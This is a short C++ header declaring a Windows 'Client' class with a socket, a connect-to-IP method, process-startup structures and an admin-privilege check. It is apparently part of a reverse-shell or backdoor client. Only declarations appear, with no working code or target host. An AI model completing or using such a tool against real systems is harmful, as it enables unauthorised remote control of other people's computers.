// client.h

#include "includes.h"

bool isAdmin();
class Client 
{
public:
    WSADATA wsaData;
    SOCKET wSock;
    struct sockaddr_in hax;
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;

    int connect(short port, char *ip);
};